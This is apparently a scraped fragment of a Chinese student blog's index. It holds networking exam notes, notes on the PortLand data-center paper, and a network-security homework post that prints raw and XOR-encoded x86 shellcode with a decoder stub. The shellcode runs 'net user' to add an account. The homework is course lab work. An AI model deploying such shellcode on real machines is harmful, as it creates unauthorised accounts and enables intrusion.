电话交换网：传统电话网络中的话音业务采用电路交换技术，除端局到用户的本地回路(Subscriber Loop)是模拟的以外，其它部分都是数字的。 分组交换 分组交换：概念 交换分组，以分组为单元统计复用线路（也称为链路）资源\n统计复用：只有有数据要传输才占用线路 分组大小问题：太小，分组开销大；太大，复用效率低，影响其它分组的发送 现代的电话网络支持话音、数据等综合业务，对于数据采用分组交换技术 数据报交换 数据报交换：直接发送分组\n特征 无连接：直接发送分组，无服务质量保证 健壮性：相同源-目的的分组可能沿不同路径传输，可绕开故障路径 路由表 分组携带的控制信息中包含目的地址 目的地址在传输过程中保持不变 交换机根据路由表来独立地转发分组 使用目的地址来查找 性能 IP网络采用数据报交换，在网络层执行交换，交换的单元为IP分组，执行交换的设备也被称为IP路由器 虚电路交换 虚电路交换：先建立连接，再发送分组\n特征 面向连接：分组发送前在源和目的之间建立连接 与电路交换不同，连接不是占用固定的线路资源，只是告诉网络的资源需求，在每个交换机上建立“连接状态” 建立的连接路径被称为虚电路（Virtual Circuit） 服务质量保证 有序性：同一源和目的的分组沿相同的路径到达目的地 基于虚电路标识执行交换操作，效率高 虚电路 VCI（VC Identifier）：在每条物理线路/链路可以同时运行很多条虚电路，每条虚电路由VCI标识 VCI具有局部意义，只在每条链路上唯一 每个交换机上都维护一个转发表，基于VCI对分组进行转发 从源到目的的虚电路由路径链路上一系列VCI标识 ![[Pasted image 20240101134653.png]] 性能 ATM网络采用虚电路交换，交换的单元为固定长度的ATM 信元，执行交换的设备也被称为ATM交换机 总结 以分组为单元统计复用线路/链路资源 优点：线路利用率高，节点只有在有数据要传输时才占用通信线路，因此多个节点的分组可以共享一条通信线路 缺点：需要资源管理机制来保证数据传输的速率、延时、可靠性和有序性，增加了复杂性 分组交换是为数据传输设计的，支持可变的数据速率 网络体系结构 DTN体系架构 解决的问题 传统网络路由假设：在任何时候，总能找到从源到目的的端到端路径。 DTN网络环境：由于连接的间隙性，可能会出现端到端路径不存在的情况 基本思想：走一步看一步，而不像传统路由那样直接找到从源到目的的路径。关键问题：下一步如何确定？ 最简单的策略：把数据交给我当前能通信的所有节点（感染路由），性能最好，开销最大！ 更复杂的策略：根据一些知识来选择数据转发的下一跳（单拷贝/多拷贝路由），例如历史相遇信息，节点运动信息等，这可以减小开销，但是性能会下降。 DTN中引入了Bundle Protocol （BP），可以在TCP/IP和非TCP/IP网络中运行，BP实现Custody Transfer SDN 当前网络问题 网络缺乏灵活的控制机制 基本思想： 数据面和控制面分离，数据路由传输由控制器控制，赋予外部应用通过控制器控制网络设备的能力 openflow OpenFlow是SDN的一种实现，定义了控制器和交换机/路由器之间的协议，以及交换机/路由器的控制接口、流表格式等 现有Internet存在的问题 可扩展性：流量增加、路由表膨胀 移动性：越来越多的移动用户接入到Internet，在设计时未考虑移动性支持 服务质量：IP网络提供的是尽力投递服务，未考虑数据内容 网络安全：越来越多的应用使用Internet，在设计时并未充分考虑安全性 能耗：互联网耗电量约占全球的5.4%，我国是4.3%，还在不断增长 Internet体系结构本生存在问题，无法彻底解决这些问题！重新设计Internet体系结构！ NSF Future Internet Architecture Program •Founded in 2010, design for next 15 years\nNamed Data Networking MobilityFirst NEBULA/eXpressive Internet Architecture/ChoiceNet 基本特征：除了数据传输，网络具有更多的能力，例如内容计算、内容存储等，而且网络更加灵活可变，例如可编程等 NDN Named Data Networking\n当前网络问题 路由器不知道传输的内容导致冗余传输，从而浪费带宽，增加能耗 设计思路 用户关注的是内容，而不是内容在什么地方：内容名取代地址 通过内容命名，可以实现自动缓存来优化带宽 在安全性方面，NDN确保的是内容安全，而不是内容所在处的安全 MobilityFirst 解决的问题 网络节点身份和位置标识相同（IP地址） 设计 GUID - Mapping ![[Pasted image 20240101140521.png]] GUID:Globally Unique Name 表示节点身份的标识和表示节点位置的地址分离 通过路由器缓存来减少移动过程中的数据丢失 每次更换地址 (1)Update GUID - Address Mapping (2)Direct traffic to new address 未来网络应用场景和需求：网络5.0 以物联网、云计算、大数据和人工智能为核心 工业互联网、车联网、远程医疗、智能电网 5G网络，解决低延迟、移动性和大连接问题 超高带宽、延迟保证 ","date":"2024-01-02T08:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E4%B8%80%E7%AB%A0/","title":"信息网络协议基础第一章复习"},{"content":" 题型：简答题问答题\n往年题合集： 试卷合集\n整理的小抄：A4小抄\n第一章 信息网络概述 ﻿交换技术 交换、电路交换、分组交换（虚电路交换ATM、数据报交换IP） 原理 特点 为什么需要交换？ 减少网络中节点之间所需的通信线路 增强可扩展性,构建更大规模网络\n交换的概念 交换操作由一系列过程组成：为输入数据选择输出线路/端口，在输入和输出之间建立连接，通过该连接将数据放到输出线路/端口上 网络中执行交换操作的设备称为交换机。通过一系列交换机的交换操作，在两个通信节点之间建立一条数据传输路径，这条路径由物理或者逻辑上的链路组成\n电路交换：概念 交换传输线路或者时隙，通过交换机在通信双方之间建立一条专用的传输路径 传输路径建立后，数据像流一样在路径上传输 空分交换：传输路径由线路组成 时分交换：传输路径由每条线路上的固定时隙组成 电路交换：特征 网络通信包括三个过程\n（发送）端到（接收）端电路连接建立 数据传输 电路连接拆除 优点：占用固定的线路资源，保证数据传输的速率、延时、可靠性及有序性 缺点：线路资源利用率低，没有有数据传输时也占用线路或者固定时隙；电路连接建立导致延迟 电路交换：性能 网络体系结构 ﻿现有网络体系结构面临哪些主要挑战？有哪些主要的解决方案？ 第二章 接入网技术 接入网架构 ﻿常用接入网络类型有哪些？各自有什么特点？ ﻿﻿802.11无线局域网 - 共享、资源利用率高、成本低 - 共享信道的访问控制机制 - 覆盖范围 ﻿基本CSMA/CA原理、扩展CSMA/CA原理 RTS、CTS ﻿站点切换过程 无源光接入网 ﻿PON网络架构、关键技术 ATM的apon 以太网EPON 第三章IPv6协议 NATA\\CIDR ﻿﻿NAT技术原理及其局限性 ﻿﻿前缀汇聚、前缀最长匹配规则； 学会汇聚 带来问题：路由匹配到多个表项 ﻿﻿路由表配置 使得路由表项最少 ﻿﻿IPv6地址 ﻿﻿链路局部地址、全局地址、常用组播地址（全节点、全路由器、被请求节点）\n地址范围 被请求节点地址是邻居发现机制非常重要的地址 ﻿﻿IPv6邻居发现机制\n地址解析、地址重复检测、路由器发现 ﻿﻿基于EUI-64地址的IPv6地址自动配置过程 ﻿﻿IPv4/IPv6过渡机制\n﻿﻿手动隧道配置、自动隧道（ISATAP、6to4）原理和配置 掌握基本的IP网络配置，包括地址、路由等 注意实验\n第四章IP网络移动管理 重新配置ip地址\n移动切换 网络层切换与链路层切换 ﻿﻿移动IPv6 ﻿基本原理、如何对上层应用屏蔽移动性？ ﻿可以优化的地方？ ﻿﻿PMIPv6 ﻿引入原因及原理 第五章IP网络服务质量 ﻿基本概念 服务质量度量：延迟、带宽、丢包率 QoS度量参数；流、行为集合、服务等级协议 支持QoS操作的路由器功能 接纳控制 流量调节 流量控制 两个服务质量模型 ﻿综合服务原理，综合服务类型\n﻿区分服务原理，EF PHB和AF PHB\n第六章 路由和交換 路由器功能与架构 ﻿路由查找算法 ﻿﻿Binary Trie、Leaf Pushing、LC Trie （Multi-Bit Trie, PathCompression）、Tree Bitmap的原理和采用的数据结构 ﻿﻿交换结构 ﻿﻿路由器吞吐量和加速、内部阻塞和输出端口竞争的概念 ﻿﻿3代交换结构 ﻿﻿Banyan交换结构 ﻿﻿输入队列与输出队列 ","date":"2024-01-02T00:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/","title":"信息网络复习提纲"},{"content":"得分10/10\n修改源代码 ![[IMG_2949.png]]\nshellcode 1 2 3Z:\\toStudentCh11-3\u0026gt;GetShellcode.exe 4/* 292=0x124 bytes */ 5\u0026#34;\\x33\\xc0\\x50\\x68\\x2f\\x61\\x64\\x64\\x68\\x74\\x30\\x31\\x20\\x68\\x20\\x74\u0026#34; 6\u0026#34;\\x65\\x73\\x68\\x75\\x73\\x65\\x72\\x68\\x65\\x78\\x65\\x20\\x68\\x6e\\x65\\x74\u0026#34; 7\u0026#34;\\x2e\\x68\\x70\\x61\\x64\\x2e\\x68\\x6e\\x6f\\x74\\x65\\x8b\\xfc\\x68\\x57\\x66\u0026#34; 8\u0026#34;\\x0d\\xff\\x68\\x63\\x89\\xd1\\x4f\\x68\\xc9\\xbc\\xa6\\x6b\\x5a\\xe8\\x56\\x00\u0026#34; 9\u0026#34;\\x00\\x00\\x8b\\xf0\\x5a\\xe8\\x4e\\x00\\x00\\x00\\x8b\\xd8\\xe8\\x05\\x00\\x00\u0026#34; 10\u0026#34;\\x00\\xe9\\xce\\x00\\x00\\x00\\x51\\x52\\x56\\x57\\x55\\x8b\\xec\\x8b\\xd7\\x83\u0026#34; 11\u0026#34;\\xec\\x54\\x8b\\xfc\\x6a\\x14\\x59\\x33\\xc0\\x89\\x04\\x8f\\xe2\\xfb\\xc6\\x47\u0026#34; 12\u0026#34;\\x10\\x44\\x8d\\x47\\x10\\x57\\x50\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a\\x00\\x6a\u0026#34; 13\u0026#34;\\x00\\x6a\\x00\\x52\\x6a\\x00\\xff\\xd6\\x83\\xf8\\x00\\x74\\x03\\x50\\xff\\xd3\u0026#34; 14\u0026#34;\\x8b\\xe5\\x5d\\x5f\\x5e\\x5a\\x59\\xc3\\x56\\x53\\x51\\x52\\xe8\\x11\\x00\\x00\u0026#34; 15\u0026#34;\\x00\\x83\\xf8\\x00\\x7e\\x07\\x8b\\xd8\\xe8\\x17\\x00\\x00\\x00\\x5a\\x59\\x5b\u0026#34; 16\u0026#34;\\x5e\\xc3\\x64\\xa1\\x30\\x00\\x00\\x00\\x8b\\x40\\x0c\\x8b\\x40\\x1c\\x8b\\x00\u0026#34; 17\u0026#34;\\x8b\\x40\\x08\\xc3\\x8b\\x43\\x3c\\x8b\\x44\\x18\\x78\\x03\\xc3\\x8b\\xf0\\x8b\u0026#34; 18\u0026#34;\\x4e\\x18\\x8b\\x46\\x20\\x03\\xc3\\x8b\\x44\\x88\\xfc\\x03\\xc3\\x57\\x8b\\xf8\u0026#34; 19\u0026#34;\\xe8\\x17\\x00\\x00\\x00\\x5f\\x3b\\xc2\\x74\\x06\\xe2\\xe6\\x33\\xc0\\xeb\\x0b\u0026#34; 20\u0026#34;\\x8b\\x46\\x1c\\x03\\xc3\\x8b\\x44\\x88\\xfc\\x03\\xc3\\xc3\\x53\\x51\\x52\\x57\u0026#34; 21\u0026#34;\\x33\\xd2\\x0f\\xbe\\x07\\x83\\xf8\\x00\\x74\\x13\\x8b\\xda\\x8b\\xca\\xc1\\xe3\u0026#34; 22\u0026#34;\\x19\\xc1\\xe9\\x07\\x0b\\xd9\\x8b\\xd3\\x03\\xd0\\x47\\xeb\\xe5\\x8b\\xc2\\x5f\u0026#34; 23\u0026#34;\\x5a\\x59\\x5b\\xc3\u0026#34;; 24 XorByte=0xfe 25/* 292=0x124 bytes */ 26\u0026#34;\\xcd\\x3e\\xae\\x96\\xd1\\x9f\\x9a\\x9a\\x96\\x8a\\xce\\xcf\\xde\\x96\\xde\\x8a\u0026#34; 27\u0026#34;\\x9b\\x8d\\x96\\x8b\\x8d\\x9b\\x8c\\x96\\x9b\\x86\\x9b\\xde\\x96\\x90\\x9b\\x8a\u0026#34; 28\u0026#34;\\xd0\\x96\\x8e\\x9f\\x9a\\xd0\\x96\\x90\\x91\\x8a\\x9b\\x75\\x02\\x96\\xa9\\x98\u0026#34; 29\u0026#34;\\xf3\\x01\\x96\\x9d\\x77\\x2f\\xb1\\x96\\x37\\x42\\x58\\x95\\xa4\\x16\\xa8\\xfe\u0026#34; 30\u0026#34;\\xfe\\xfe\\x75\\x0e\\xa4\\x16\\xb0\\xfe\\xfe\\xfe\\x75\\x26\\x16\\xfb\\xfe\\xfe\u0026#34; 31\u0026#34;\\xfe\\x17\\x30\\xfe\\xfe\\xfe\\xaf\\xac\\xa8\\xa9\\xab\\x75\\x12\\x75\\x29\\x7d\u0026#34; 32\u0026#34;\\x12\\xaa\\x75\\x02\\x94\\xea\\xa7\\xcd\\x3e\\x77\\xfa\\x71\\x1c\\x05\\x38\\xb9\u0026#34; 33\u0026#34;\\xee\\xba\\x73\\xb9\\xee\\xa9\\xae\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\u0026#34; 34\u0026#34;\\xfe\\x94\\xfe\\xac\\x94\\xfe\\x01\\x28\\x7d\\x06\\xfe\\x8a\\xfd\\xae\\x01\\x2d\u0026#34; 35\u0026#34;\\x75\\x1b\\xa3\\xa1\\xa0\\xa4\\xa7\\x3d\\xa8\\xad\\xaf\\xac\\x16\\xef\\xfe\\xfe\u0026#34; 36\u0026#34;\\xfe\\x7d\\x06\\xfe\\x80\\xf9\\x75\\x26\\x16\\xe9\\xfe\\xfe\\xfe\\xa4\\xa7\\xa5\u0026#34; 37\u0026#34;\\xa0\\x3d\\x9a\\x5f\\xce\\xfe\\xfe\\xfe\\x75\\xbe\\xf2\\x75\\xbe\\xe2\\x75\\xfe\u0026#34; 38\u0026#34;\\x75\\xbe\\xf6\\x3d\\x75\\xbd\\xc2\\x75\\xba\\xe6\\x86\\xfd\\x3d\\x75\\x0e\\x75\u0026#34; 39\u0026#34;\\xb0\\xe6\\x75\\xb8\\xde\\xfd\\x3d\\x75\\xba\\x76\\x02\\xfd\\x3d\\xa9\\x75\\x06\u0026#34; 40\u0026#34;\\x16\\xe9\\xfe\\xfe\\xfe\\xa1\\xc5\\x3c\\x8a\\xf8\\x1c\\x18\\xcd\\x3e\\x15\\xf5\u0026#34; 41\u0026#34;\\x75\\xb8\\xe2\\xfd\\x3d\\x75\\xba\\x76\\x02\\xfd\\x3d\\x3d\\xad\\xaf\\xac\\xa9\u0026#34; 42\u0026#34;\\xcd\\x2c\\xf1\\x40\\xf9\\x7d\\x06\\xfe\\x8a\\xed\\x75\\x24\\x75\\x34\\x3f\\x1d\u0026#34; 43\u0026#34;\\xe7\\x3f\\x17\\xf9\\xf5\\x27\\x75\\x2d\\xfd\\x2e\\xb9\\x15\\x1b\\x75\\x3c\\xa1\u0026#34; 44\u0026#34;\\xa4\\xa7\\xa5\\x3d\u0026#34;; 45 Success: encode is OK 46 47 48 49length of shellcode = 315 = 0x13b 50/* 315=0x13b bytes */ 51\u0026#34;\\xeb\\x10\\x5b\\x53\\x4b\\x33\\xc9\\x66\\xb9\\x24\\x01\\x80\\x34\\x0b\\xfe\\xe2\u0026#34; 52\u0026#34;\\xfa\\xc3\\xe8\\xeb\\xff\\xff\\xff\\xcd\\x3e\\xae\\x96\\xd1\\x9f\\x9a\\x9a\\x96\u0026#34; 53\u0026#34;\\x8a\\xce\\xcf\\xde\\x96\\xde\\x8a\\x9b\\x8d\\x96\\x8b\\x8d\\x9b\\x8c\\x96\\x9b\u0026#34; 54\u0026#34;\\x86\\x9b\\xde\\x96\\x90\\x9b\\x8a\\xd0\\x96\\x8e\\x9f\\x9a\\xd0\\x96\\x90\\x91\u0026#34; 55\u0026#34;\\x8a\\x9b\\x75\\x02\\x96\\xa9\\x98\\xf3\\x01\\x96\\x9d\\x77\\x2f\\xb1\\x96\\x37\u0026#34; 56\u0026#34;\\x42\\x58\\x95\\xa4\\x16\\xa8\\xfe\\xfe\\xfe\\x75\\x0e\\xa4\\x16\\xb0\\xfe\\xfe\u0026#34; 57\u0026#34;\\xfe\\x75\\x26\\x16\\xfb\\xfe\\xfe\\xfe\\x17\\x30\\xfe\\xfe\\xfe\\xaf\\xac\\xa8\u0026#34; 58\u0026#34;\\xa9\\xab\\x75\\x12\\x75\\x29\\x7d\\x12\\xaa\\x75\\x02\\x94\\xea\\xa7\\xcd\\x3e\u0026#34; 59\u0026#34;\\x77\\xfa\\x71\\x1c\\x05\\x38\\xb9\\xee\\xba\\x73\\xb9\\xee\\xa9\\xae\\x94\\xfe\u0026#34; 60\u0026#34;\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\x94\\xfe\\xac\\x94\\xfe\\x01\\x28\\x7d\u0026#34; 61\u0026#34;\\x06\\xfe\\x8a\\xfd\\xae\\x01\\x2d\\x75\\x1b\\xa3\\xa1\\xa0\\xa4\\xa7\\x3d\\xa8\u0026#34; 62\u0026#34;\\xad\\xaf\\xac\\x16\\xef\\xfe\\xfe\\xfe\\x7d\\x06\\xfe\\x80\\xf9\\x75\\x26\\x16\u0026#34; 63\u0026#34;\\xe9\\xfe\\xfe\\xfe\\xa4\\xa7\\xa5\\xa0\\x3d\\x9a\\x5f\\xce\\xfe\\xfe\\xfe\\x75\u0026#34; 64\u0026#34;\\xbe\\xf2\\x75\\xbe\\xe2\\x75\\xfe\\x75\\xbe\\xf6\\x3d\\x75\\xbd\\xc2\\x75\\xba\u0026#34; 65\u0026#34;\\xe6\\x86\\xfd\\x3d\\x75\\x0e\\x75\\xb0\\xe6\\x75\\xb8\\xde\\xfd\\x3d\\x75\\xba\u0026#34; 66\u0026#34;\\x76\\x02\\xfd\\x3d\\xa9\\x75\\x06\\x16\\xe9\\xfe\\xfe\\xfe\\xa1\\xc5\\x3c\\x8a\u0026#34; 67\u0026#34;\\xf8\\x1c\\x18\\xcd\\x3e\\x15\\xf5\\x75\\xb8\\xe2\\xfd\\x3d\\x75\\xba\\x76\\x02\u0026#34; 68\u0026#34;\\xfd\\x3d\\x3d\\xad\\xaf\\xac\\xa9\\xcd\\x2c\\xf1\\x40\\xf9\\x7d\\x06\\xfe\\x8a\u0026#34; 69\u0026#34;\\xed\\x75\\x24\\x75\\x34\\x3f\\x1d\\xe7\\x3f\\x17\\xf9\\xf5\\x27\\x75\\x2d\\xfd\u0026#34; 70\u0026#34;\\x2e\\xb9\\x15\\x1b\\x75\\x3c\\xa1\\xa4\\xa7\\xa5\\x3d\u0026#34;; 71 72命令成功完成。 73 74 75 76Z:\\toStudentCh11-3\u0026gt; 查看用户 ","date":"2023-12-23T11:28:18+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A7/","title":"网络安全作业7"},{"content":"PortLand: a scalable fault-tolerant layer 2 data center network fabric 💡 Meta Data Title\nPortLand: a scalable fault-tolerant layer 2 data center network fabric\nJournal\nAuthors\nRadhika Niranjan Mysore; Andreas Pamboris; Nathan Farrington; Nelson Huang; Pardis Miri; Sivasankar Radhakrishnan; Vikram Subramanya; Amin Vahdat\nPub. date\n八月 16, 2009\n期刊标签\nDOI\n10.1145/1592568.1592575\n附件\nNiranjan Mysore 等 - 2009 - PortLand a scalable fault-tolerant layer 2 data c.pdf\n📜 研究背景 \u0026amp; 基础 \u0026amp; 目的 这篇论文的研究背景是针对日益增长的数据中心网络中存在的限制和挑战，例如在现有的层2和层3网络协议在支持大规模数据中心中的灵活性、效率和容错性方面存在的局限性 在笔者提出的论文中，研究的基础是现有网络协议在面临未来单个站点拥有数百万虚拟终端的数据中心时所面临的挑战，特别是关注于如何在这种大规模环境中实现可扩展、易管理、容错和高效的数据中心网络结构\n论文的目的是设计和实现一种名为PortLand的协议，该协议旨在解决现有网络在数据中心部署中的局限性，通过提供一种可扩展、容错、并适用于数据中心环境的层2路由和转发协议通过PortLand协议的设计和实施，论文的目的是展示该协议能够支持“即插即用”的大规模数据中心网络，并为数据中心网络提供更灵活、高效和容错的解决方案\nARP是地址解析协议（Address Resolution Protocol），用于将IP地址映射成对应的MAC地址的协议。在局域网中，当一台设备需要发送数据给另一台设备时，它会使用ARP来获取目标设备的MAC地址，以便将数据发送到正确的目标。ARP协议在以太网和其他局域网技术中广泛使用。\n📊 研究内容 PMAC是如何设计的\nPMAC（Pseudo MAC）地址的设计是基于一种层次化的编码方式。在PortLand中，每个主机被分配一个唯一的PMAC地址，该地址编码了主机在拓扑结构上的位置。例如，在同一个pod中的所有终节点的PMAC地址具有相同的前缀。主机保持不变，认为它们仍然使用其实际的MAC地址（AMAC）。当主机发送ARP请求时，它们接收到目标主机的PMAC地址[5a]。所有的数据包转发都是基于PMAC地址进行的，这样可以实现非常小的转发表。发送数据包时，出口交换机会对PMAC地址进行重写，将其转换为目标主机的AMAC地址，以保持主机不变的MAC地址的幻象。\n步骤1：当入口交换机首次看到源MAC地址时，会将数据包传送到交换机。\n步骤2a：软件在本地PMAC表中创建一个条目，将主机的AMAC和IP地址映射到其PMAC。边缘交换机决定PMAC。\n步骤2b：交换机将此映射通信给“Fabric Manager”。\n步骤3：“Fabric Manager”使用此状态来响应ARP请求。交换机还会创建适当的流表条目，将 PMAC 目标地址重写为 AMAC，以便对任何发送到主机的流量重写PMAC目的地地址。\nProxy-based ARP “Ethernet by default broadcasts ARPs to all hosts in the same layer 2 domain. We leverage the fabric manager to reduce broadcast overhead in the common case, as depicted in Figure 3. In step 1, an edge switch intercepts an ARP request for an IP to MAC address mapping and forwards the request to the fabric manager in step 2. The fabric manager consults its PMAC table to see if an entry is available for the target IP address. If so, it returns the PMAC in step 3 to the edge switch. The edge switch creates an ARP reply in step 4 and returns it to the original host.” (Niranjan Mysore 等, 2009, p. 43) 🔤以太网默认情况下会向同一第 2 层域中的所有主机广播 ARP。如图 3 所示，我们利用结构管理器来减少普通情况下的广播开销。在步骤 1 中，边缘交换机拦截 IP 到 MAC 地址映射的 ARP 请求，并在步骤 2 中将请求转发给结构管理器。Fabric 管理器会查询其 PMAC 表，查看是否有目标 IP 地址的条目。如果有，它会在步骤 3 中将 PMAC 返回给边缘交换机。边缘交换机在步骤 4 中创建 ARP 回复，并将其返回给原始主机。🔤\n步骤1-2：边缘交换机拦截针对IP到MAC地址映射的ARP请求，并将请求转发给布线管理器。ARP请求不被广播。\n步骤3：布线管理器查询其PMAC表，查看目标IP地址是否有条目可用。如果有，则返回PMAC给边缘交换机。\n步骤4：边缘交换机创建ARP响应，并将其返回给原始主机。\n“Note that end hosts receive PMACs in response to an ARP request and that all packet forwarding proceeds based on the hierarchical PMAC. The egress switch performs PMAC to AMAC rewriting only on the last hop to the destination host.” (Niranjan Mysore 等, 2009, p. 43)\nPMAC是针对ARP请求的应答而接收到的，所有数据包转发都是根据层次式PMAC进行的。出口交换机只在最后一跳到达目标主机时才执行PMAC到AMAC的重写。\nDistributed Location Discovery LDP\n“we also present a location discovery protocol (LDP) that requires no administrator configuration. PortLand switches do not begin packet forwarding until their location is established.” (Niranjan Mysore 等, 2009, p. 44) 🔤我们还介绍了一种无需管理员配置的位置发现协议（LDP）。在确定位置之前，PortLand 交换机不会开始转发数据包。🔤\nLDM\n“PortLand switches periodically send a Location Discovery Message (LDM) out all of their ports both, to set their positions and to monitor liveness in steady state. LDMs contain the following information:” (Niranjan Mysore 等, 2009, p. 44) 🔤PortLand 交换机会定期向其所有端口发送位置发现信息（LDM），以设置其位置并监控稳定状态下的有效性。LDM 包含以下信息：🔤\n交换机标识符（switch id）：每个交换机的全局唯一标识符，如所有本地端口的最低 MAC 地址。 pod 号码（pod）：同一 pod 中所有交换机共享的号码（见图 1）。不同 pod 中的交换机将有不同的 pod 编号。核心交换机从不设置此值。 位置 (pos)：分配给每个边缘交换机的编号，在每个 pod 中都是唯一的。 树级别（level）：0、1 或 2，取决于交换机是边缘交换机、汇聚交换机还是核心交换机。我们的方法适用于更深的层次结构。 向上/向下（dir）：Up/down（向上/向下）是一个位，表示交换机端口在多根树中的朝向是向下还是向上。 行7:如果一个交换机在足够长的时间内没有连接到超过 k/2 个邻居交换机，则它是边缘交换机。行8:incoming_port up 在接收到任何后续的LDM时，边缘交换机推断相应的入站端口是一个朝上的端口。\n行10、11:交换机在上行端口上接收到来自边缘交换机的 LDM 时，会断定自己一定是聚合交换机，而且相应的传入端口是下行端口。\n行12-13:\u0026ldquo;第12-13行处理核心/聚合交换机向尚未设置部分端口方向的聚合/边缘交换机传输LDMS的情况。\u0026ldquo;行14:核心交换机的验证首先要验证其所有活动端口都已连接到其他 PortLand 交换机\n行15-18:然后在第 15-18 行中验证所有邻居都是尚未设置链接方向的汇聚交换机（连接到边缘交换机的汇聚交换机端口已被确定为朝下）。\n行20:如果这些条件成立，交换机就可以断定自己是核心交换机，并将其所有端口设置为向下。\n如算法 1 第 2-4 行和第 29 行所示，在多个位置号码同时被提议的情况下，聚合交换机会将提议的位置号码保留一段时间，然后再计时。\n起初，除了交换机标识符和端口号外，其他所有值都是未知的。\n我们假设所有交换机端口都处于三种状态之一：断开、连接到终端主机或连接到另一台交换机。\n“Edge switches learn their level by determining that some fraction of their ports are host connected.” 🔤边缘交换机通过确定其部分端口已连接主机来了解其等级。🔤\n“Level assignment then flows up the tree. Aggregations switches set their level once they learn that some of their ports are connected to edge switches.” 🔤然后，级别分配会沿着树向上流动。汇聚交换机在得知其部分端口连接到边缘交换机后，就会设置自己的级别。🔤\n“Finally, core switches learn their levels once they confirm that all ports are connected to aggregation switches.” 🔤最后，核心交换机在确认所有端口都连接到汇聚交换机后，就会学习其级别。🔤\nProvably Loop Free Forwarding 交换机使用 LDP 建立本地位置后，就会利用来自邻居的更新来填充转发表。\n核心交换机会了解直接连接的汇聚交换机的 pod 编号。转发数据包时，核心交换机只需检查 PMAC 目标地址中与 pod 编号相对应的位，即可确定适当的输出端口。\n汇聚交换机也会了解所有直接连接的边缘交换机的位置编号。汇聚交换机必须通过检查 PMAC 来确定数据包的目的地是同一 pod 中的主机还是不同 pod 中的主机。如果在同一 pod 中，则必须将数据包转发到与 PMAC 中位置条目相对应的输出端口。\n如果在不同的 pod 中，在无故障的情况下，数据包可以沿着汇聚交换机的任何链路转发到核心层。为实现负载平衡，交换机可采用多种技术选择合适的输出端口。Fabric 管理器将采用额外的流量表项来覆盖单个流量的默认转发行为。不过，这一决定与本工作无关，因此我们假定采用标准技术，如 ECMP 中的流量散列技术[16]。\n我们的转发协议通过观察上行-下行语义[26]可证明是无环的，数据包将总是被转发至聚合交换机或核心交换机，然后向其最终目的地下行传输。我们通过确保一旦数据包开始向下传输，便不可能向拓扑结构的上行传输，以防止瞬时环路和广播风暴。\n“Fault Tolerant Routing” 步骤1：如果在一段可配置的时间内没有接收到LDM(在此上下文中也称为keepalive)，交换机将在步骤1中假定链路发生故障。\n步骤2:检测交换机将故障通知fabric管理器。\n步骤3:fabric管理器维护一个包含整个拓扑的每链路连接信息的逻辑故障矩阵，并用新信息更新它。\n步骤4:最后，在步骤4中，fabric管理器将故障通知所有受影响的交换机，然后这些交换机根据新版本的拓扑分别重新计算它们的转发表。\n“Required state for network connectivity is modest, growing with k3/2 for a fully-configured fat tree built from k-port switches.” (Niranjan Mysore 等, 2009, p. 45) 网络连接所需的状态是适度的，对于由k端口交换机构建的完全配置的胖树来说，它随着k3/2的增长而增长。\nFault Tolerant Routing for Multicast 现在我们考虑组播和广播情况下的容错。相对于现有的协议，我们考虑的故障场景是，没有一个单一的生成树植根于一个核心交换机，能够覆盖一个多播组或广播会话的所有接收器。考虑图5中的示例。\n在这里，我们有一个多播组映射到最左边的核心交换机。有三个接收器，分布在0号pod和1号pod（图中三个R）。发送端将数据包转发到指定的核心交换机，核心交换机再将数据包分发给接收端。\n步骤1：在步骤1中，pod 0中两个突出显示的链接同时失败。\n步骤2:两个汇聚交换机检测到故障并通知fabric管理器\n步骤3:fabric管理器更新其故障矩阵。\n步骤4:fabric管理器计算所有受影响的多播组的转发表项。\n步骤5:我们通过计算与每个多播组相关联的接收器集的贪婪集覆盖来处理这种情况。这可能导致多个指定的核心交换机与多播或广播组相关联。fabric管理器在图5的步骤5中将所需的转发状态插入到适当的表中。\n从故障中恢复需要通过pod 0中的两个单独的聚合交换机进行转发。但是，不存在同时连接两个汇聚交换机的单核交换机。\n🚩 研究结论 📌 感想 \u0026amp; 疑问 Why existing L2 and L3 techniques can not satisfy R1-5 for the cloud datacenter? 单一网络结构（R1和R2）： 云数据中心要求整个数据中心使用一个相同的网络结构，但L3技术需要为每个交换机配置子网信息，而L2技术由于需要支持广播而面临效率和可扩展性的挑战。 透明虚拟机迁移（R3）： 在L3中，虚拟机迁移到不同子网的主机时需要切换IP地址，这导致透明的迁移变得不可能。而L2的MAC表也面临着在硬件上不切实际的问题。 转发环路问题（R4）： 无论是L2还是L3，在路由收敛期间都可能发生转发环路问题，这在设计上很困难。 高效路由协议（R5）： 要求一种能够快速传播拓扑变化的高效路由协议，但现有的L2和L3协议都是基于广播的，效率不高。 What is PMAC address?、 PMAC（Pseudo MAC）地址是PortLand网络设计中使用的一种地址。每个终端主机在PortLand中被分配了一个唯一的PMAC地址，用于编码该主机在网络拓扑中的位置。PMAC地址使得路由转发和虚拟机迁移变得高效。终端主机保持其实际的MAC（AMAC）地址不变，不知道自己被分配了一个PMAC地址。在进行ARP请求时，源主机会收到目标主机的PMAC地址。所有的数据包转发都基于PMAC地址进行，这样可以实现非常小的转发表。出口交换机会对PMAC地址进行转换，以保持目标主机的MAC地址不变。\nLocation discovery. 位置发现是指在网络中确定设备的位置的过程。根据提供的上下文信息[2]，PortLand使用一种轻量级协议来帮助交换机发现其在拓扑中的位置。交换机通过接收LDM（Link Detection Message）来了解其邻居交换机的信息，通过判断与多少个邻居交换机相连来确定是否为边缘交换机。边缘交换机通常有一半以上的端口连接到终端设备。在确认自己是边缘交换机后，交换机可以通过在所有端口上进行PING操作来进一步确认其位置。终端设备将回复PING请求，而不会发送LDM。\nHow 